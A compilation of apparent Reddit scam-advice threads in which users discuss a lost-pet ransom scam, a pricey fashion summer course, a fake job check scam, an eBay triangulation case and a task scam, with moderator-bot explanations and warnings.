- If it wasn't a scam, they could have easily emailed you an estimate for the surgery, I never pay anything without documentation.
- More red flags than the Chinese Communist Party.
- any update?
- Hey OP, is there an update? hope your sister's kitty is found safe and sound and these scammers go to hell.
- It is all a scam. They do not have your cat.
- They don't have your car, it's always a scam
- Ok, we all know this is a scam, I just hope you get your cat back.



Have you followed the general procedure for a lost cat? It great that you've put up flyers, but there's also putting out clothes that smell like you, put out the litter box (that one is controversial, some experts advise against, some for), started checking under things at dusk and dawn with a flashlight, checked in places they might be trapped etc.?

  
Pawboost and maybe perfbi might be good places to post, too.
- Report them to police
- 100% scam.
- They don't have your cat

This is a scam
- Definitely a scam https://www.fbi.gov/contact-us/field-offices/elpaso/news/fbi-tech-tuesday-beware-of-lost-pet-scams
- [removed]
- They probably got the numbers from the chip company. They probably look for lost pet pings and then go for them. It is horrible but most likely how they got in.
- [removed]
- I would bet they don't even have the cat... The information can be found relatively easy on the internet, especially if you have access to some shady databases. You would be surprised how much information is out there, and what relations can be revealed by some proper use of data analytics.
- Charities will take a donation via credit card. But, you cannot reverse or contest a Zelle like you can with a CC.
- OP says the number they called was not on the poster, so my guess is that they posted something on facebook and they were able to access the phone number from a data breach.
- This is probably close.
They posted on social, scammer checked and found ‚Äúfriend/contact‚Äù sister with cat and not poster. Looked up number in same area code as poster.
- Thank you for confirming! She will contact the shelter when they open in the morning, if anything, to just check and give herself a peace of mind
- >Any reputable place would rather have credit cards or cash than some weird cash app, especially when it comes to donations.

It's well known that reputable veterinarians and shelters demand Apple gift cards for their services. /s
- You're correct that it's a scam but Facebook is actually one of the best tools for matching up lost pets with animals in the shelter. I work at an animal shelter and we are all on Facebook because of someone loses their pet, 9 times out of 10 the first thing they do is post it there
- Omg how awful. Almost the exact scenario too
- There's a special place in hell for these people.
- Sounds like the scammers have spoofed the shelters number and they‚Äôre saying they have to call OP/OP‚Äôs sister because the shelter is closed and will just go to voice mail. It gets around that little problem for the scammers.
- She's going to drive there or at least contact them first thing in the morning, she couldn't go at the time they called because she has kids. It's just so gross to pick at people at their most vulnerable :(
- The wording here is confusing. Of course the cat exists. OP knows the cat exists.
- Hi /u/Theba-Chiddero, AutoModerator has been summoned to explain the Pet scam.

First, you will encounter a breeder who may have their own website or who may post listings on an established website. They will offer a good price for a pet with papers, however they will not be able to meet you in real life, and will only sell you the pet with the use of a shipping/courier/freight service. The scammer will demand payment via irreversible payment methods such as Cash App, Venmo, Western Union, or cryptocurrency. The websites they use are usually very easy to spot, as the domain will have been registered recently, and the images they use should be findable using [reverse image search](https://imgops.com/). Once you pay the scammers and they know they have you, they will demand more and more fees for things like airline insurance, crating fees, papers, import permits, etc.

If you are involved in a pet scam, you need to stop talking with the scammers and dispute any transactions that you are able to dispute. [Here](https://www.akc.org/expert-advice/news/spot-puppy-scam/) is an article from the AKC regarding pet scams, and [here](https://toronto.ctvnews.ca/woman-scammed-out-of-950-trying-to-adopt-puppy-for-free-1.4929787) are [two](https://www.cbc.ca/news/canada/newfoundland-labrador/nl-alleged-pet-scam-1.5623735) news articles about pet scams.

- Thank you for checking in! I've gotten so many responses it's hard to say thank you individually to everyone. 

As predicted, it was a scam and the kitty is still lost :( I shared what people said with my sister and she is both disgusted by the scammers and grateful for everyone's confirmation. I think she just got hopeful but I'm glad she didn't fall for it.

- I bet it's not even the actual shelter. Spoofed number probably
- They don't have the cat.
- agree.  the we can't send pictures pretty much confirms it.
- Of course they don't have the cat.  This is 100% a scam.  Why would they need to have the cat to pull this?
- Yeah but they got the number somewhere OP might not realise theres a million ways they couldve linked the number to the missing cat
- You would not do that in the midst of a medical emergency was my point.
- agree.   people using lost pets to scam people makes my blood boil.
- They don't have the cat. This is a very common scam when people post about a missing cat.
- People who are worried don't think clearly, so they are ideal targets.
- The scammers don‚Äôt have the cat.
- Of course it isn't the shelter.  Do you think animal shelters call owners and say "pay us vial Zelle this instant or we are gonna kill your cat, sight unseen?"
- It is a spoofed number.
- Definitely. If they had the cat, they would send pictures to make their story stronger.
- Of course they don't have the cat, even the sister knows this on some level. 
But I can totally understand her anguish: she's already upset over her cat going missing and being told you not paying someone will cause the cat to die overrides your common sense. This scam is so evil.
- Yes, I'm aware. But that's exactly what's confusing. You say "the  cat doesn't exist" when you mean "the scammers don't have the cat". Maybe this was copypasta from a similar scam where the scammers pretend to be selling a nonexistent cat?
- [deleted]
- I understand Schrodinger's cat. 

When the title of the post is "Scammers said they will euthanize my cat if I don't send them money" and you respond with "the cat doesn't exist", it appears you're saying OP's (sister's) cat doesn't exist. That's why I said it's confusing.

A real cat IS involved. We hope it's alive, but it's unknown at this point if it is or not. And I think it's poor humor to say that the cat doesn't exist without making it more clear that you're not referencing OP's cat.

Title: Is Vogue Summer School Legit?
Body: Hi, so I just got into Vogue Summer School, a 12 day fashion course taking place in June/July/August. I found out about it through TikTok so I applied, it was a 81AUD application fee, and then if you get in around 1.5K USD deposit, and then 7.5K for boarding/tuition and food! When applying I got an email telling me my application will be reviewed and I'll find out in a few weeks however I got an acceptance notice within hours of applying- keep in mind this is a NYC based program however I'm in AUS. I then went on TikTok and nearly everyone who applied had gotten in, which I found super weird..I couldn't find many videos of people going though the program has been around since the 2000s....apparently...Then I went to reserve my spot for said course, it said I could just pay the 1.5K USD as a deposit within 2 weeks of picking my spot then pay the rest leading up to the program however once I picked it it only gave me 20mins to checkout- didn't pay because 1.5K USD is multiple months of my job in a 20mins decision...So then it told me I had to also pay the entire +7.5K on the spot if I want to keep it? What the heck? I've got the weirdest feeling ever, so many vids of girls getting in but like 10 videos of people going?? Crazy work. Anyone gone? Know anything about it? Idk man.

- Legit in that it's something for people with loads of money to do. If there's no accreditation then it means nothing and adds nothing to your CV. 

If you are really interested in a career in fashion there are more useful things you can do that don't involve spending this kind of money.

If its being pushed by influencer then that's another reason to avoid it. Influencers get paid to make adverts....they don't check if something is worthwhile or value for money. They probably haven't even done it!! Their job is to appeal to as many people as possible.

Find someone to do some work experience with-a designer, a tailor, a fashion magazine etc, whatever you are interested in....the reality of doing a job is very very different to what you imagine it to be....you want to have a good idea if it's actually for you before you start booking trips abroad!
- Are you sure accomodation is included in that price? You probably would need to travel under a student visa, which might not be that easy to get.
- I did a cursory Google search and found a post from someone saying that they offer scholarships and financial aid to international students. Maybe everyone gets in who wants to go but you need to apply separately for the financial aid? The post I saw said only a few people got approved for that and that it required an essay and portfolio. They claim they received their acceptance in 3 weeks.

I found it (edit to clarify what "it" is: I found the page about scholarships, not the post described above) on their official website, actually, but it says scholarship applications for 2025 have closed, unfortunately.

I don't think it's a scam, per se, it is promoted/run by Vogue magazine and Cond√© Nast, which are both legitimate players in the fashion magazine industry. It's really a matter of if you think that experience is going to bring you at least $7,500 worth of value.
- Good for you for checking and being skeptical. It's extremely risky to send that kind of money to a "school" that you know nothing about. NO school gives you "20 minutes" to make up your mind.

EDIT: Hmm, it seems to be a real program, run by a for-profit company called BrandEd Holdings. The address of the school is the address of this company. 

It's affiliated with the Sotheby's Institute of Art, which is a real and totally legitimate program. 

 [https://branded-edu.com/](https://branded-edu.com/) The British spellings are because the program seems to be based in the UK.

BUT you still need to do more due diligence. Are you sure you're really talking to someone from this school, and not some TikTok scammer who is pretending to be them?

Call the number on the school's website [https://www.voguecollege.com/academics/](https://www.voguecollege.com/academics/)

and ask a LOT of questions. Explain that you think you might be getting scammed by someone pretending to be them online, and ask how the application for the summer program works.  It might make sense to start a fresh application and throw away the other one.
- If you are from Aus, why not find something local, cheaper and where you can actually visit first?
- total scam
- It‚Äôs a scam
- honestly, like i want it to be real SO bad however from all the vids ive seen on tt...erm!!
- So just my take: in the opening paragraph they use weird phrasing and inconsistently use the Oxford comma. ¬†I wouldn‚Äôt give any company this sloppy my money, especially not $7500. ¬†There‚Äôs not much they can teach you about design and marketing, considering they don‚Äôt even know about basic editing. ¬†

They also do not have any connections ¬†to vogue magazine whatsoever.¬†

ETA: they also have a 646 number (a cell phone area code) not 212 (the original NY landline) as their official contact number for their New York office. ¬†They don‚Äôt use American English. ¬†

Lastly, I‚Äôm a born and bred New Yorker and as a teen was obsessed with all things fashion and vogue. ¬†if this place had been around in the early 2000s like it says it has, I would have heard about it and would have BEGGED my parents to let me go- but it has zero history of existence on the internet prior to September 2024. ¬†Don‚Äôt think this is legit OP.
- yes!!
- Wait, this sounds super dumb or airheaded but I work a low paying job at a local cafe, meaning I never even had to make a CV or know what one is, what's an example of something that could add to a CV/if I even went would it be seen by say a newspaper or fashion magazine and they wouldn't even care? 

I honestly agree, the money is still the shocking part to me! And oh dang, maybe I shouldn't go then I noticed influencers are pretty much liars but I just assumed most were just other teens who just blew up but that's a super good point they might have just been told hey can you pretend you did it?? Oof

Smart!! I'll try, we have my Oma's sewing machine so I might start there and maybe start blogging, I feel like I could sort of teach myself some of the things I mean I take photography at school and I'm decent enough with computers! And I honestly get that, I have a job at a cafe and thought it would be a cute chilled out job but nope! So definetly will do way more research, with more thinking aswell I'm a bit scared to spend the 12K (AUD lol) and go...'hey guys um yk when i went to ny for fashion? i wanna be a nurse now', I dont think Id hear the end of it!! And yes, that mayyyy be a good idea (very good one actually hshs!!)
- Oh dang, I completely forgot about the whole visa thing, especially getting a visa now? Struggle ahaha, and yup apparently it's that for the 3 meals a day and accomadation- you dorm with 2 other girls!
- Ah! That makes a lot of sense actually, I‚Äôd assume they let heaps in and then see who actually does pay/goes? Maybe I just applied when all the applications were getting reviewed meaning mine was checked faster or something! But that makes sense about the scholarship! I wish I could get a Scholarship but based on my Mum‚Äôs job I don‚Äôt think I‚Äôd be eligible even though I‚Äôm paying with my own money ahaha I‚Äôll have to do more research on Cond√© Nast but that actually is very reassuring!! I‚Äôm now really torn because it‚Äôs 12K AUD + Flights (a few thousand) and then I‚Äôd probs have to give myself a day or two because I get plane sick‚Ä¶all things to consider, might try to convince my parents to let me go next year when I have more money & could apply for a scholarship! Thank you so much for helping with research on it! 7.5K is so much lol!
- It‚Äôs not just $7500, OP will also need to book a flight, pay for travel health insurance and budget bare minimum $50/day (US) just for existing in NYC.¬†

I also don‚Äôt see where it‚Äôs promoted or run by vogue or Cond√© Nast. ¬†They don‚Äôt even have a 212 number and they operate out of a totally random kinda run down building on 51st/Lexington.
- I went to New York with my mum last year and she was totally in love with it and completely stoked about how much opportunities they offered to those in the arts compared to where we live/Australia in general. We checked out this film school thing while we were there (I forgot the name oops) which offered precollege programs/summer camps and my mum has offered if I can raise the money she'll pay for my flight to there, that's why when I saw this I kinda lost my mind and was like 'oh my gosh fashion and photojournalism!!' something where we live doesn't even offer, we're quite far from the major cities so I've been trying to teach myself aha!  
  
 Ignore the little sob story bit here but my parents grew up and even raised me when we were very very poor ngl and we recently got some money and they want to try to give me the best opportunities they can (within reason) especially with their age/conditions! I completely get where you're coming from, I've definetly been looking for quite a while aa!!
- Even if it‚Äôs a school 9k usd for what exactly?
- That attitude is how scammers stay profitable
- I'm confused by this take, why would you want it so bad if all the videos are bad? At least that's what I'm getting from what you said
- https://preview.redd.it/bqmguwxzw4fe1.jpeg?width=693&format=pjpg&auto=webp&s=8293be295c84809080634390848152b2448e537f
- Reading this my jaw like actually DROPPED, how did I not even notice thisss?! Maybe I don't wanna learn off people who can't even use an oxford COMMA?? (I know I make a billion spelling mistakes in every comment in my defense I just bought a mechanical keyboard and it is WEIRD...they're meant to be VOGUE??) 

Thats such a small detail I would've never even noticed not being from new york or from america! Definetly a red flag over the cellphone vs original ny landline thing- (also def going down a rabbithole about that tonight), I think it's funny because I'm so used to using Australian/British English in my essays and American online its all morphed into one that I don't even notice how it's spelled anymore...Good spot oml...

And woah that's actually super cool, but oh dang so they need to get their story atleast half beliveable to anyone from nyc?? I think the goal is to only advertise to kids outside of ny after reading this and seeing how many non ny/nj/american people in general got in? And wait no way NO HISTORY?? I saw TikToks about it from June & July 2024 but still that is CRAZY weird...Maybe not!
- They're making 7.5K without guaranteeing a job or anything else, I bet they accept anyone willing to pay. In my opinion it's a waste of money, but I don't know shit about the fashion industry.
- If you want a career in a certain field it's  useful to show that you've been interested in it for so long etc when you are looking for work/university. If this course was accredited and you got a certificate or qualification then it would be worth doing, that could go on your CV. If you did work experience that can go on your CV too. Your current job can too of course!

If you can, do a beginner sewing course. Look at your local college or adult education place. It doesn't have to be a crazy expensive one, just something to get you up and running, so you know your way around a machine and how to troubleshoot and how to read and sew a pattern. Once you have the basics down you can take it in any direction you want.....and it won't cost you even close to $14k+!!
- The website is soooo strange.... They want students age 15-18, but there is not a lot that would reassure parents to let their children travel there. They say they have a campus, but there is no address of that, no pictures of the accomodations, nothing. Maybe they expect the kids to be accompanied by a parent, they don't offer pick-up from the airport, absolutely nothing. 

I'm not saying it's human trafficking at all, this would be the most stupid way to go about that, it just does not look like this website would entice anyone to actually pay for this. Maybe it's just an advance fee scam. Maybe they ask you one week before the course starts if you have the right visa, and then it's sorry, no refund, if you can't come. 

That they are accepting everyone and then putting this much pressure is definitely not how real colleges operate. 

Weird, the whole thing. Tell your parents you don't want to go any longer...
- It's a huge financial commitment, but if you're really serious about fashion and you think you'll learn something valuable it could be worth it. You could also likely put it on your resume when you start looking for jobs. Good luck making your decision!

646 is a NY phone number, it's just one of the newer ones

get good

3rd edit: I'm sorry I'm just completely mind boggled at how wrong you are about all of this. Not only is the GE Building an extremely famous skyscraper with its own Wikipedia page, but it has a lot of well-known tenants, including Air India, Cornell University, The Real Estate Board of New York, Sotheby's Institute of Art, etc. [https://570lexingtonave.com/](https://570lexingtonave.com/)

I'm going to try and stop now but it's just so easy to prove you wrong
- All together it's around 12k AUD, It's meant to be a Vogue Fashion course, I'm interested in the media element where you learn from industry experts and get press passes n stuff for vogue and learn basically all about editorials and stuff aha
- 'I know there are a half dozen red flags, but I want to believe!'
- I def mis phrased that ahaha!! I mean the videos aren‚Äôt bad but it‚Äôs the same girls all the time I swear &they‚Äôre all like influencer types/only posting about the skl!! But it‚Äôs like the only opportunity for me I can probs get access too weirdly enough & Its (meant to be) Vogue!! Which would be the dream!
- This guy has no idea what he's talking about, I replied to one of his other comments because holy shit. They ran out of 212 numbers in NY in like the 90s, there was a whole bit in Sex and the City about it. Having a 646 area code isn't suspicious at all.

Claims to be a New Yorker but also says in his reply to me that they're run out of a "totally random" "run down" building, when if you look up the address turns out to be the GE Building, an incredibly famous skyscraper that is so "totally random" that it has it's own Wikipedia page [https://en.wikipedia.org/wiki/General\_Electric\_Building](https://en.wikipedia.org/wiki/General_Electric_Building)

The domain for the school is registered to Advance Magazine Publishing, the parent company of Cond√© Nast (the company that publishes Vogue and other well-renowned magazines) with an @ [condenast.com](http://condenast.com) email address and a physical address at One World Trade Center.

This guy is suffering from Dunning Kruger or something, I have no idea what the hell he's talking about

edit: RE: the oxford comma... I think it's more of a comma splice than an Oxford comma and maybe it just didn't get caught in editing. I think it's not a list of three things, but rather two: fashion industries + media and lifestyle industries. However, saying Fashion and media and lifestyle sounds weird, but splitting up media and lifestyle would be incorrect if that's the full name of the industry they were referring to. So it may have been a stylistic choice as well. This is an idiotically minor thing to obsess over.
- Very good point. I'm just 15 so it is precollege so I assumed no job at the end but the amount in USD is wild to me? I swear that's insane for 12 days...But maybe because I'm not from the US it's actually kinda good? It's not accredited either?
- Thank you so much for explaining! So it's almost like a speciallised resume! I totally get it now, so honestly it isn't a scam but it is just kinda sketch how they phrased the website& it's definetly more for a rich kid's whose parents think they're doing right by them by sending them to the program for 12 days type of thing rather than actual course where you'll take a bunch from it and it'll look great on the CV! I think I did some of those school holiday community acting classes when I lived in the city as a kid like that- like NIDA did it lol! 

Hey that's perfect timing you mention work experience because when school starts back I'm doing it this year! 

I'll try to hunt out something like that, I think because of my area I'll have most luck with YouTube or maybe even when I do my volunteering asking some older folks if they could teach me! And that's so true, thank you so much because this made so much sense and I think that's what I'm gonna do! I was half also wanting to go baaaack to NY again because I definetly miss it, however I reckon it'd be way cheaper and enjoyable to learn seperate to a trip anyway! (How can I learn when jetlagged)! I already know some hand sewing, sooo headstart! I'll definetly be on the look out for courses and be probaaably saving that money!
- Oh my gosh do you have cameras on me rn?! jkjk lol literally me reading the comments trying not to sound like im about to go 'wait but guys hear me out'
- Oh! Dang! That's kinda funny, maybe I need to do way more research...Is it time to admit I've never watched Sex and the City?! But oh woah that's what I initally thought but then second guessed myself! And oh very true, putting it that way the phrasing would be soo messed up if it was like fashion and lifestyle and media! This makes waay more sense lol!
- I thought the same about the area code. Seinfeld did an episode where Jerry's new girlfriend has a 646 area code.  The episode aired in 1998. 

OP, the website looks fairly legit to me.
- You'll also have to pay for your plane ticket.
- Nah, we keep getting the same reactions every day.
- Yup, pretty steep...considering how much any trips out of Aus are
- They take people aged 15-18 so you don't have to go right now if you don't have the money. Follow the website for when they open registrations next year. Meanwhile you could try and find some people that took this course and ask them if it's worth it.
- Very good point! I'd be paying my own money (which is fair!) but my parents said this year is my only shot because they aren't gonna let me mess up year 11/12, but definetly gonna look for more testimoniels and stuff because still seems so sus...Thank u for checking it out because the reaffirmation was very needed here- I think definetly may needa do more digging
- Find something closer to home. These kinds of places have been around a long time and the number of people who actually make money in the modeling/acting industry is very tiny compared to the number of people who want to.

If modeling is your aim, you are more likely to get local work than international.
- Ever since reading these comments I definetly will be seeking more local or just oppotunities in Aus, I've heard about that so much and honestly it freaks me out- That's why I've always liked the buisness/production end wayyy. Definetly would be a dream to do fashion or anything artsy as a career one day but maybe I should do one step at a time...

Title: Nearly got Got this week: Sherly from Lanier Biotherapeutics - A Saga
Body: I know this is my first post here, but I appreciate this sub: it actually helped me flag this encounter and avoid getting fleeced, so I'm doing my duty and paying it forward. All names will be abbreviated, omitted, or changed to adhere to guidelines. No screenshots or images will be provided, those are being saved for the FBI...

Short version details and highlights:

\- Company being used as a front for a job offer / fake check scam: Lanier Biothera---, based in Jefferson GA  
\- (Lanier has apparently closed now, but that info was hard to find - I finally found a bankruptcy docket from March 2024 to confirm)  
\- \[I was also able to contact a former co-founder of Lanier, who confirmed the business is shuttered.\]  
\- Resume on Indeed caught their attention, direct emailed to my personal email  
\- Interview conducted over IM (not voice or video) via Microsoft Teams, with no set appointment time, just pop on before close of business to begin.  
\- Very quick turnaround decision on interview  
\- Instructed to receive a digital copy of an e-check, to deposit said check via mobile, to then purchase high-value office equipment for the remote job offer

The long version: 

I received an email telling me my resume had caught their eye on Indeed (which makes sense, I've been updating and fine-tuning for a couple of months). I was instructed to download Microsoft Teams to meet an HR rep, Sherly G. The instructions said that as long as I reached out before 6pm eastern that day, I'd be able to interview. This was a little strange to me - I'm used to interviews for remote positions usually booking through Calendly or Google Calendar, but I'm down for IM-based communication if that's what's best for the other party. 

I first went and did my research on the company, Lanier Biothera---. I was excited to see a professional website, location info that matched what I had received in the initial email, and I decided it couldn't hurt to proceed with the interview. 

I spent a couple hours going back and forth with Sherly G., answering 15 interview questions, most of which seemed legit. It was only after reviewing this sub later that I realized a huge red flag in one of the questions: The name of my banking institution. I *assumed* it was just to verify that I was a legal person, capable of being hired, that I had a bank account in good standing to eventually have my pay direct deposited. Since I wasn't asked to provide account details, just to verify I had a banking institution I could use and not just, like, Venmo or Paypal, I answered that question too. 

I now know this is a red flag, because it allows the scammer to avoid sending you a fake check with your same bank name or a related bank. Fool me once, but I learned your tricks now, Sherly!

At the conclusion of my interview yesterday, I was told I would have a decision this morning at 8am Eastern. I was at my computer on time, ready to have closure, and I was so excited to see that I was being offered the job! I received a formal job offer to my personal email, which I reviewed, and all the information matched what had been discussed yesterday and what I knew of the company. The letterhead and legal footer seemed legit, and I readily electronically signed and returned the document. 

Then it all started to fall apart. I'd been told the company would provide a payment to allow me to purchase required home office equipment; I'd assumed this would take the form of a mailed check, or a direct deposit. I was startled when Sherly told me I would be receiving an e-check to my email. I immediately went back to Google, which led me here, to other threads that confirmed this was sketchy as hell. I decided to see how far I could get Sherly to take this, because if I did receive the images of the e-check, I'd be able to verify its authenticity or fraudulence pretty easily. 

Which is exactly what happened. I received two clearly forged images, front and back of a check, which NO mobile banking app would accept as viable deposit. The business address for Lanier on the check image was in Redding, CA, and therefore did not match the addresses in Georgia which I knew were accurate from my research. The bank supposedly issuing the check had been closed and merged with another institution back in 2017, and permanently closed in 2021. I called Sherly out, reported the whole thing to the FBI/IC3, and then came here. 

I also was able to verify that Lanier Biothera--- has since shuttered, there are bankruptcy documents dated March of 2024 that prove this. I ALSO-also found an old news release, from when Lanier was formed from the merger of two other companies, that listed a co-founder's name and phone number. This was the ONLY phone number I could locate, so I gave it a go. I left him a voicemail, and *he actually returned my call*! He confirmed that Lanier was no longer operating, and that the opportunity was in fact a scam. He also said he was still in contact with the former owner of Lanier, and he would let that person know the company was being used to front a scam. 

So, yeah: how's y'alls weekends starting off so far?

- They tried to do the same thing to my girlfriend this week, I thought it was odd that there was never a phone call or virtual meeting, so i dug into it. Which lead me to find this post as well as the bankruptcy 10 months ago. So thank you very much.
- Good story. You did a great job researching this, and explaining what happened. Your post will help other people.

Edit: your post already helped someone!
- I'd be interested to know if the FBI or IC3 follows up on this. These things are so common that law enforcement seems to just shrug and eyeroll about them. 

This one does seem to have been done with much more care and detail than usual - finding a real company that has closed, finding a real bank that has closed, etc. 

Anyway, buy yourself a beer: you won this one. 

>I decided to see how far I could get Sherly to take this, because if I did receive the images of the e-check, I'd be able to verify its authenticity or fraudulence pretty easily.

Going forward, don't do this. Assume scam, close the door, don't engage.
- I just got an email from this company today. Glad I googled them before responding
- The lesson is:

ALL remote jobs in 2025 should be assumed scams until proven otherwise.
- For reference: !fakecheck !job
- Look, I'm allowed to be proud of myself for avoiding buying $4,400 worth of equipment with fake money...

But yeah, you right... Sue me, I'm a storyteller!
- I'll gladly update if I hear any more from the feds. I don't expect I will, but perhaps I'll be pleasantly surprised!
- Hi /u/ditzen, AutoModerator has been summoned to explain the Fake check scam.

The fake check scam arises from many different situations (fake job scams, fake payment scams, etc), but the bottom line is always the same, you receive a check (a digital photo or a physical paper check), you deposit a check (via mobile deposit or via an ATM) and see the money in your account, and then you use the funds to give money to the scammer (usually through gift cards or crypto). Sometimes the scammers will ask you to order things through a site, but that is just another way they get your money.

Banks are legally obligated to make money available to you fast, but they can take their time to bounce it. Hence the window of time exploited by the scam. During that window of time the scammer asks you to send money back, because you are under the illusion that the funds cleared.

When the check finally bounces, the bank will take the initial deposit back, and any money you sent to the scammer will come out of your own personal funds. Usually the fake check deposit will be reversed in a few weeks, but it can also take several months. If you do not have the funds to cover the amount, your balance will go negative. Your bank will usually charge a fee for depositing a bad check, and your account may be closed depending on the severity of the scam. Here is an article from the FTC: https://www.consumer.ftc.gov/articles/how-spot-avoid-and-report-fake-check-scams, and here is an article from the New York Times: https://www.nytimes.com/2020/02/21/your-money/fake-check-scam.html

If you deposited a bad check, we recommend that you notify your bank immediately.

- Hi /u/ditzen, AutoModerator has been summoned to explain the Job scam.

Fake job scams come in many different varieties. The scammers will usually conduct interviews over Whatsapp, Telegram or Teams. They will offer high wages for the work being done, oftentimes with wildly varied wage ranges by hour, and they will \"hire\" you by telling you that you are hired, rather than going through the normal process that a company takes when hiring an employee in your country.

If they mention anything about a check or about receiving and sending out transactions, it is a [fake check scam](https://www.consumer.ftc.gov/blog/2018/09/anatomy-fake-check-scam). If they say they will cut you a check so you can buy equipment for remote work, it's a scam in which they make you purchase equipment on a fake website under their control, with your own card, and when the check bounces in a few weeks you're left holding the bag (and the equipment never comes)

If they mention anything about receiving, processing, or inspecting packages, it is a [parcel mule scam](https://en.wikipedia.org/wiki/Parcel_mule_scam).

If they ask you to purchase items up-front, ask you to pay a fee in order to be hired, or ask you to purchase gift cards, it is an [advance-fee scam](https://en.wikipedia.org/wiki/Advance-fee_scam). If they mention Bitcoin ATMs, [it's always a scam](https://coinatmradar.com/blog/avoid-scams-dont-use-bitcoin-atm-when-someone-asked-you/).

If the job involves posting advertisements on Facebook Marketplace, Craigslist or eBay, they are using you and your account to scam other people (especially if it's rental listings). Thanks to redditor AceyAceyAcey for this script.

Rightfully so. It's just that everything is a matter of perspective.

Title: Potential eBay Shipping Scam Involving a ‚ÄúMix-Up‚Äù and Forwarding Items
Body: Hi everyone, I‚Äôm trying to determine if this situation is a scam or legitimate. Here‚Äôs what happened:

I recently purchased a pair of shoes on eBay. 2 days after, I received a message from the seller saying they accidentally shipped my shoes to another customer, and I‚Äôd likely receive the wrong size (size 9 instead of my order). The seller asked if I could ship the incorrect shoes to the other customer once I receive them, and they‚Äôd provide me with a prepaid label. The other customer would ship them to me as well. They also offered to refund me if I‚Äôd rather not participate.

I want to clarify that the seller has a high rating (over 7,900 stars), and I did actually order the shoes. However, I‚Äôm concerned because I‚Äôve read about scams involving buyers being asked to forward items.

Here‚Äôs what I‚Äôve done so far:

Checked my eBay messages, and this message does show up there.


Confirmed that I made the purchase and am waiting for the shoes to arrive.



My questions:

Has anyone encountered this type of situation before?


Should I agree to forward the shoes, or should I open a case with eBay if they send me the wrong item?


Is this a common scam, or does it sound like an honest mistake?



Thanks in advance for any advice!

- I feel like there was a post earlier in the day about a similar scenario - but I can't find it.

It had to do with somebody who received a nasty letter from the person who was supposed to get some shoes or something, to the person to whom the item was diverted to.
- Just do what you have to do when you don't get what you ordered. Open a Case. If you don't it's going to be too late and they can show you got your order.
- Open a case with Ebay and return the wrong shoes and get your money back.
- !triangulation should bring it up
- It looks like a scam. Just return the product to seller. Otherwaise you have no protection. Keep all comunication on Ebay platform.
- It sounds like an honest mistake but I would just do the refund personally.
- I had this happen.  I contacted seller via Ebay, and I forwarded on the wrong item (a specialty car part) using their pre-paid label and later received the correct item (a wallet), but couldn't tell if it really came from a 3rd party, or was a re-ship from original. 

Shipping was all within US, and I'm in a sales tax state, so doesn't seem like anything to be gained.  

Honestly feel like it was a drop-shipper who made an error with shipping, and not something more nefarious.
- I'd open a case with Ebay and let them handle it. My paranoid brain worries about drugs, etc. being concealed  in those shoes.
- The formatting is all messed up.
- Hi /u/onmyti89_again, AutoModerator has been summoned to explain the Triangulation scam.

A [triangulation scam](https://www.reddit.com/r/Scams/s/dyLMK2PxtI) involves four actors:
* A scammer posing as a seller on a popular platform
* A legitimate buyer
* A victim whose card was stolen
* A legitimate merchant

The seller is the scammer acting as a middleman - typically in platforms that involve third party sellers such as Amazon or similar. A legitimate buyer purchases the item. The scammer then goes to a legitimate merchant and buys the item with a stolen card, and ships it to the buyer. The buyer receives the item, and the owner of the stolen credit card is left holding the bag.

The way to tell if you‚Äôve been a participant of a triangulation scam is that the tracking number provided in the platform will not match the shipping label of the item you just received. This is because the seller needs to submit a tracking number on most platforms, so they will send you an empty package, an envelope, or a random item, to generate such a shipping label in the buyer‚Äôs name.

Any time there‚Äôs two shipments involved in a purchase, report it. If you suspect you have been an unwilling participant in a triangulation scam, call the number on the back of your card and talk to the fraud department. Also contact the support channel of the platform where you bought the item. You want to establish a paper trail.

Title: Is this a scam or am I getting hired for viewbotting?
Body: A number from India wrote me on Whatsapp, saying they have a long term job offer paying 500-1000‚Ç¨ a day, which obviously can't be true. But after I said I was interested to see where it was going, they daid all I had to do was like a Youtube video and I would get 10‚Ç¨. This seemed somewhat legit so I asked how I would get the money, and they said they send it to my bank account or through Paypal. What are the dangers of giving a potential scammer my Bank ID or my Paypal? Could this be an actual "Buy Likes" site looking for people to hire? Would I actually get the money?

- You think 500‚Ç¨ a day ‚Äúobviously can‚Äôt be true‚Äù ‚Ä¶ but 10‚Ç¨ for less than a minute of work seems ‚Äúsomewhat legit‚Äù?
- Block and ignore... Block and ignore.... If you even express mild curiosity, you'll be added to their lists of people who can potentially be fooled, and you'll get bigger and better scams coming your way. Please get real. There is no free money. There is no 10 euros for liking something.
- Just don't waste your time. Absolute best case you dick around with these bozos in some third world country and get 10 euro out of it. Then they continue pestering you because they think you're a sucker and they can get more out of you. I assume you have better things to do with your time. You know it's a scam, why bother?
- !task scam
- I know what you are thinking: "I'll get the free money and then ghost the scammers". We've seen this many times in the past.

These task scammers generally don't care about losing a few euro here and there: for them it's part of the cost of doing business and it's not their money anyway. Yes, you are being sent money freshly stolen from somebody else: do you think these scammers use their own money as lure? But sometimes, when these scammers want to teach careless baiters and time wasters (99% of them both) a lesson or just get mad, they will take vengeance. 

This usually takes the form of harassment, digging up as much information about the victim as they can find to formulate threats and putting contact info in the "sucker lists" that get traded around. Are ‚Ç¨10 really worth the risk? Inflation will wipe them out in just a few months.
- Doctors don‚Äôt make ‚Ç¨1,000 a day.
- Are you seriously thinking someone would pay ‚Ç¨1k a day for something a literary a monkey could do?

If this was a real job with that type of work it would be under 1k/month 

 But they can't do anything with your paypal or bank as long as you didn't give them anything so they can log on.

It's a task scam and no serius company will hire through whatsapp.
- Oh come on seriously? You think anyone's going to pay you 10‚Ç¨ for liking a video? A bot can do that for free. You're going to be scammed, and it'll be your fault.
- You get a joke offer from India and you wonder if it is a scam ?
- Not just that, but how are they supposed to verify you actually liked it?
- In the sense that i could see someone paying money for liking a video, even though yes 10‚Ç¨ is still a mot so i don't think i'll see that money

I'm still intrigued as to what their goal is then, because i don't think the effort is worth it to maybe get one like every once in a while, so what are they really after?
- That's what I'm thinking, 10‚Ç¨ per like won't pay out so i won't see any money; but what's their endgame then? I'm kinda intrigued
- Hi /u/1Cattywampus1, AutoModerator has been summoned to explain the Task scam.

Task scams involve a website or mobile app that claims you can earn money by completing easy tasks, such as watching a video, liking a post, or creating an order. A very common characteristic (but not entirely exclusive) is that you have to complete sets of 40 tasks. The app will tell you that you can earn money for each task, but the catch is that you can only do a limited number of tasks without upgrading your account. To upgrade your accounts, the scammers will require you to pay a fee. This makes it a variant of the advance fee scam.

